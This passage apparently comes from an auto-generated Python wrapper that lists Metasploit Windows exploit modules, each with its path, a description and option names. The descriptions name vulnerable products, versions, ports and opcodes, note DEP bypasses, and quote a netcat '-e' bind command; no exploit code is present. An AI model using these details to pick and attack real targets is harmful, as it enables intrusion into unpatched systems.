			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_nettransport(object):
		"""
		
          This exploits a stack buffer overflow in NetTransport Download Manager,
        part of the NetXfer suite. This module was tested
        successfully against version 2.90.510.
      
		"""

		path = 'windows/misc/nettransport'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_fb_cnct_group(object):
		"""
		
          This module exploits a vulnerability in Firebird SQL Server.  A specially
        crafted packet can be sent which will overwrite a pointer allowing the attacker to
        control where data is read from.  Shortly, following the controlled read, the
        pointer is called resulting in code execution.

        The vulnerability exists with a group number extracted from the CNCT information,
        which is sent by the client, and whose size is not properly checked.

        This module uses an existing call to memcpy, just prior to the vulnerable code,
        which allows a small amount of data to be written to the stack. A two-phases
        stackpivot allows to execute the ROP chain which ultimately is used to execute
        VirtualAlloc and bypass DEP.
      
		"""

		path = 'windows/misc/fb_cnct_group'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_actfax_raw_server_bof(object):
		"""
		
          This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW
        Server can be used to transfer fax messages without any underlying protocols. To
        note significant fields in the fax being transferred, like the fax number or the
        recipient, ActFax data fields can be used. This module exploits a buffer overflow
        in the handling of the @F506 fields due to the insecure usage of strcpy. This
        module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).
      
		"""

		path = 'windows/misc/actfax_raw_server_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_realtek_playlist(object):
		"""
		
          This module exploits a stack buffer overflow in Realtek Media Player(RtlRack) A4.06.
        When a Realtek Media Player client opens a specially crafted playlist, an
        attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/realtek_playlist'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_hp_dataprotector_encrypted_comms(object):
		"""
		
        This module exploits a well known remote code execution exploit after establishing encrypted
        control communications with a Data Protector agent. This allows exploitation of Data
        Protector agents that have been configured to only use encrypted control communications.

        This exploit works by executing the payload with Microsoft PowerShell so will only work
        against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows
        Server 2008 R2.
      
		"""

		path = 'windows/misc/hp_dataprotector_encrypted_comms'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_misc_nvidia_mental_ray(object):
		"""
		
        The Nvidia Mental Ray Satellite Service listens for control commands on port 7414.
        When it receives the command to load a DLL (via an UNC path) it will try to
        connect back to the host on port 7514. If a TCP connection is successful it will
        then attempt to load the DLL. This module has been tested successfully on Win7 x64
        with Nvidia Mental Ray Satellite Service v3.11.1.
      
		"""

		path = 'windows/misc/nvidia_mental_ray'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_LISTEN_PORT = 'LISTEN_PORT'
			required_SMB_DELAY = 'SMB_DELAY'

	class windows_misc_hp_imc_uam(object):
		"""
		
        This module exploits a remote buffer overflow in HP Intelligent Management Center
        UAM. The vulnerability exists in the uam.exe component, when using sprint in a
        insecure way for logging purposes. The vulnerability can be triggered by sending a
        malformed packet to the 1811/UDP port. The module has been successfully tested on
        HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).
      
		"""

		path = 'windows/misc/hp_imc_uam'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_sap_netweaver_dispatcher(object):
		"""
		
          This module exploits a stack buffer overflow in the SAP NetWeaver Dispatcher
        service. The overflow occurs in the DiagTraceR3Info() function and allows a remote
        attacker to execute arbitrary code by supplying a special crafted Diag packet. The
        Dispatcher service is only vulnerable if the Developer Traces have been configured
        at levels 2 or 3. The module has been successfully tested on SAP Netweaver 7.0 EHP2
        SP6 over Windows XP SP3 and Windows 2003 SP2 (DEP bypass).
      
		"""

		path = 'windows/misc/sap_netweaver_dispatcher'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_eiqnetworks_esa(object):
		"""
		
          This module exploits a stack buffer overflow in eIQnetworks
        Enterprise Security Analyzer. During the processing of
        long arguments to the LICMGR_ADDLICENSE command, a stack-based
        buffer overflow occurs. This module has only been tested
        against ESA v2.1.13.
      
		"""

		path = 'windows/misc/eiqnetworks_esa'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_avidphoneticindexer(object):
		"""
		
          This module exploits a stack buffer overflow in process
        AvidPhoneticIndexer.exe (port 4659), which comes as part of the Avid Media Composer
        5.5 Editing Suite. This daemon sometimes starts on a different port; if you start
        it standalone it will run on port 4660.
      
		"""

		path = 'windows/misc/avidphoneticindexer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_mercury_phonebook(object):
		"""
		
          This module exploits a stack-based buffer overflow in
        Mercury/32 <= v4.01b PH Server Module. This issue is
        due to a failure of the application to properly bounds check
        user-supplied data prior to copying it to a fixed size memory buffer.
      
		"""

		path = 'windows/misc/mercury_phonebook'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_poisonivy_bof(object):
		"""
		
        This module exploits a stack buffer overflow in the Poison Ivy 2.2.0 to 2.3.2 C&C server.
        The exploit does not need to know the password chosen for the bot/server communication.
      
		"""

		path = 'windows/misc/poisonivy_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_mirc_privmsg_server(object):
		"""
		
          This module exploits a buffer overflow in the mIRC IRC Client v6.34 and earlier.
        By enticing a mIRC user to connect to this server module, an excessively long PRIVMSG
        command can be sent, overwriting the stack. Due to size restrictions, ordinal payloads
        may be necessary. This module is based on the code by SkD.
      
		"""

		path = 'windows/misc/mirc_privmsg_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'
			required_SRVNAME = 'SRVNAME'

	class windows_misc_hp_dataprotector_dtbclslogin(object):
		"""
		
          This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The
        overflow occurs during the login process, in the DtbClsLogin function provided by
        the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an
        insecure way with the username. A successful exploitation will lead to code execution
        with the privileges of the "dpwinsdr.exe" (HP Data Protector Express Domain Server
        Service) process, which runs as SYSTEM by default.
      
		"""

		path = 'windows/misc/hp_dataprotector_dtbclslogin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_ufo_ai(object):
		"""
		
          This module exploits a buffer overflow in the IRC client component of
        UFO: Alien Invasion 2.2.1.
      
		"""

		path = 'windows/misc/ufo_ai'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_hp_operations_agent_coda_8c(object):
		"""
		
          This module exploits a buffer overflow vulnerability in HP Operations Agent for
        Windows. The vulnerability exists in the HP Software Performance Core Program
        component (coda.exe) when parsing requests for the 0x8c opcode. This module has
        been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and
        Windows 2003 SP2 (DEP bypass).

        The coda.exe components runs only for localhost by default, network access must be
        granted through its configuration to be remotely exploitable. On the other hand it
        runs on a random TCP port, to make easier reconnaissance a check function is
        provided.
      
		"""

		path = 'windows/misc/hp_operations_agent_coda_8c'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_fb_isc_attach_database(object):
		"""
		
          This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted create request.
      
		"""

		path = 'windows/misc/fb_isc_attach_database'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_hp_omniinet_1(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Hewlett-Packard
        OmniInet NT Service. By sending a specially crafted MSG_PROTOCOL (0x010b)
        packet, a remote attacker may be able to execute arbitrary code with elevated
        privileges.

        This service is installed with HP OpenView Data Protector, HP Application
        Recovery Manager and potentially other products. This exploit has been tested
        against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1
        of Application Recovery Manager.

        NOTE: There are actually two consecutive wcscpy() calls in the program (which
        may be why ZDI considered them two separate issues). However, this module only
        exploits the first one.
      
		"""

		path = 'windows/misc/hp_omniinet_1'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_netcat110_nt(object):
		"""
		
          This module exploits a stack buffer overflow in Netcat v1.10 NT. By sending
          an overly long string we are able to overwrite SEH. The vulnerability
          exists when netcat is used to bind (-e) an executable to a port in doexec.c.
          This module tested successfully using "c:/>nc -L -p 31337 -e ftp".
        
		"""

		path = 'windows/misc/netcat110_nt'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_borland_interbase(object):
		"""
		
          This module exploits a stack buffer overflow in Borland Interbase 2007.
        By sending a specially crafted create-request packet, a remote
        attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/borland_interbase'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ib_svc_attach(object):
		"""
		
        This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted service attach request.
      
		"""

		path = 'windows/misc/ib_svc_attach'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_itunes_extm3u_bof(object):
		"""
		
        This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7.
        When opening an extended .m3u file containing an "#EXTINF:" tag description,
        iTunes will copy the content after "#EXTINF:" without appropriate checking
        from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary,
        which allows code execution under the context of the user.

        Please note before using this exploit, you must have precise knowledge of the
        victim machine's QuickTime version (if installed), and then select your target
        accordingly.

        In addition, even though this exploit can be used as remote, you should be aware
        the victim's browser behavior when opening an itms link.  For example,
        IE/Firefox/Opera by default will ask the user for permission before launching the
        itms link by iTunes.  Chrome will ask for permission, but also spits a warning.
        Safari would be an ideal target, because it will open the link without any
        user interaction.
      
		"""

		path = 'windows/misc/itunes_extm3u_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_misc_citrix_streamprocess_get_boot_record_request(object):
		"""
		
          This module exploits a remote buffer overflow in the Citrix Provisioning Services
        5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode
        0x40020004 (GetBootRecordRequest) to the 6905/UDP port. The module, which allows
        code execution under the context of SYSTEM, has been successfully tested on Windows Server
        2003 SP2 and Windows XP SP3.
      
		"""

		path = 'windows/misc/citrix_streamprocess_get_boot_record_request'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_citrix_streamprocess_get_footer(object):
		"""
		
          This module exploits a remote buffer overflow in the Citrix Provisioning Services
        5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet with the opcode
        0x40020002 (GetFooterRequest) to the 6905/UDP port. The module, which allows code execution
        under the context of SYSTEM, has been successfully tested on Windows Server 2003 SP2
        and Windows XP SP3.
      
		"""

		path = 'windows/misc/citrix_streamprocess_get_footer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_ibm_tsm_cad_ping(object):
		"""
		
          This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service.
        By sending a "ping" packet containing a long string, an attacker can execute arbitrary code.

        NOTE: the dsmcad.exe service must be in a particular state (CadWaitingStatus = 1) in order
        for the vulnerable code to be reached. This state doesn't appear to be reachable when the
        TSM server is not running. This service does not restart.
      
		"""

		path = 'windows/misc/ibm_tsm_cad_ping'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_fb_isc_create_database(object):
		"""
		
          This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted create request.
      
		"""

		path = 'windows/misc/fb_isc_create_database'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ib_isc_attach_database(object):
		"""
		
        This module exploits a stack buffer overflow in Borland InterBase
